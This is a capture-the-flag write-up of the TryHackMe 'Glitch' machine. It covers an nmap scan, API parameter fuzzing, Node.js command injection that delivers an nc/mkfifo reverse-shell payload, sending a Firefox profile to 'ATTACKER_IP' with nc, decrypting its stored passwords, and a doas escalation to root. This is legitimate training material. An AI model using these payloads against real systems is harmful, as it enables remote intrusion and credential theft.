# GLITCH

### Gathering Information

    1. Scan namp.
    ```
    ┌──(kali㉿kali)-[~/THM/glite]
    └─$ nmap -sV -sC 10.113.176.105
    Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-26 03:08 EDT
    Nmap scan report for 10.113.176.105
    Host is up (0.26s latency).
    Not shown: 999 filtered tcp ports (no-response)
    PORT   STATE SERVICE VERSION
    80/tcp open  http    nginx 1.14.0 (Ubuntu)
    |_http-title: not allowed
    |_http-server-header: nginx/1.14.0 (Ubuntu)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 34.22 seconds
    ```

    Go to the ```http://MACHINE_IP`` and check the page resource: 

    ![alt text](image.png)

    There, I see the api/access and i got the token.


1. What is your access token?

    ```echo "dGhpc19pc19ub3RfcmVhbA==" | base64 -d```

    I get the toke.

2. What is the content of user.txt?


    ```
    ┌──(kali㉿kali)-[~/THM/glite]
    └─$ curl -X OPTIONS http://10.113.176.105/api/items -i
    HTTP/1.1 200 OK
    Server: nginx/1.14.0 (Ubuntu)
    Date: Thu, 26 Mar 2026 07:20:35 GMT
    Content-Type: text/html; charset=utf-8
    Content-Length: 13
    Connection: keep-alive
    X-Powered-By: Express
    Allow: GET,HEAD,POST
    ETag: W/"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo"
    ```

    * Parameter Fuzzing
      * I know i can use ```POST``` and need to find out which parameter name the API is listening for and got ```cmd```
        ```
            ┌──(kali㉿kali)-[~/THM/glite]
            └─$ ffuf -u http://10.113.176.105/api/items?FUZZ=test -X POST -H "Cookie: token=dGhpc19pc19ub3RfcmVhbA==" -w /usr/share/wordlists/dirb/common.txt -fs 0

                    /'___\  /'___\           /'___\       
                /\ \__/ /\ \__/  __  __  /\ \__/       
                \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
                    \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
                    \ \_\   \ \_\  \ \____/  \ \_\       
                    \/_/    \/_/   \/___/    \/_/       

                v2.1.0-dev
            ________________________________________________

            :: Method           : POST
            :: URL              : http://10.113.176.105/api/items?FUZZ=test
            :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
            :: Header           : Cookie: token=dGhpc19pc19ub3RfcmVhbA==
            :: Follow redirects : false
            :: Calibration      : false
            :: Timeout          : 10
            :: Threads          : 40
            :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
            :: Filter           : Response size: 0
            ________________________________________________

            cmd                     [Status: 500, Size: 1081, Words: 55, Lines: 11, Duration: 262ms]
            :: Progress: [4614/4614] :: Job [1/1] :: 142 req/sec :: Duration: [0:00:37] :: Errors: 0 ::

        ```
        
        Run the payload: 
        ```
        curl -X POST "http://10.113.176.105/api/items?cmd=require('child_process').exec('rm%20/tmp/f%3Bmkfifo%20/tmp/f%3Bcat%20/tmp/f%7C/bin/sh%20-i%202%3E%261%7Cnc%20<YOUR_KALI_IP>%204444%20%3E/tmp/f')" -H "Cookie: token=dGhpc19pc19ub3RfcmVhbA=="
        ```

        Run:  ```python3 -c 'import pty; pty.spawn("/bin/bash")'```


        ```
            ┌──(kali㉿kali)-[~/THM/glite]
            └─$ nc -lvnp 4444
            listening on [any] 4444 ...
            connect to [192.168.192.40] from (UNKNOWN) [10.113.176.105] 53786
            /bin/sh: 0: can't access tty; job control turned off
            $ python3 -c 'import pty; pty.spawn("/bin/bash")
            > '
            user@ubuntu:/var/web$ 
        ```

        * Look for hidden file: ```ls -la```
        * Check SUID binaries: ```find / -perm -u=s -type f 2>/dev/null`` and found ```doas``` which is the "minimalist" version of sudo typically used in OpenBSD.
        * Run ```cat /usr/local/etc/doas.conf```
        ```
        user@ubuntu:/var/web$ cd /home
        cd /home
        user@ubuntu:/home$ ls -la
        ls -la
        total 16
        drwxr-xr-x  4 root root 4096 Jan 15  2021 .
        drwxr-xr-x 24 root root 4096 Jan 27  2021 ..
        drwxr-xr-x  8 user user 4096 Jan 27  2021 user
        drwxr-xr-x  2 v0id v0id 4096 Jan 21  2021 v0id
        user@ubuntu:/home$ find / -perm -u=s -type f 2>/dev/null
        find / -perm -u=s -type f 2>/dev/null
        /bin/ping
        /bin/mount
        /bin/fusermount
        /bin/umount
        /bin/su
        /usr/lib/dbus-1.0/dbus-daemon-launch-helper
        /usr/lib/eject/dmcrypt-get-device
        /usr/lib/openssh/ssh-keysign
        /usr/lib/snapd/snap-confine
        /usr/lib/policykit-1/polkit-agent-helper-1
        /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
        /usr/bin/at
        /usr/bin/passwd
        /usr/bin/chfn
        /usr/bin/newuidmap
        /usr/bin/chsh
        /usr/bin/traceroute6.iputils
        /usr/bin/pkexec
        /usr/bin/newgidmap
        /usr/bin/newgrp
        /usr/bin/gpasswd
        /usr/bin/sudo
        /usr/local/bin/doas
        user@ubuntu:/home$ cat /usr/local/etc/doas.conf
        cat /usr/local/etc/doas.conf
        permit v0id as root
        ```

        ```
            user@ubuntu:/$ cd home     
            cd home 
            user@ubuntu:/home$ cd user
            cd user
            user@ubuntu:~$ ls
            ls
            user.txt
            user@ubuntu:~$ cat user.txt
            cat user.txt
            THM{i_don't_know_why}
        ```


3. What is the content of root.txt?

    * I found the ```.firefox``` in the victim machine ```/home/user```.
    * Listener From Kali: ```nc -lvnp 5678 > firefox.tar```
    * Sent From victim: ```nc ATTACKER_IP 5678 < firefox.tar```
    * On the Kali Machine: 
      * Extract it: ```tar -xvzf firefox.tar```
      * Download the firefox decrypt
        ```
            git clone https://github.com/unode/firefox_decrypt.git
            python3 firefox_decrypt/firefox_decrypt.py .firefox/
        ```
    * Run the command: ```python3 ~/THM/glite/firefox_decrypt/firefox_decrypt.py .```
  
  Then ```su **v0id**```
  * Check ```doas``` configuration to see how to get root: ```cat /usr/local/etc/doas.conf```
  * Get Root: ```doas /bin/bash```
  * Get the flag: ```cat /root/root.txt```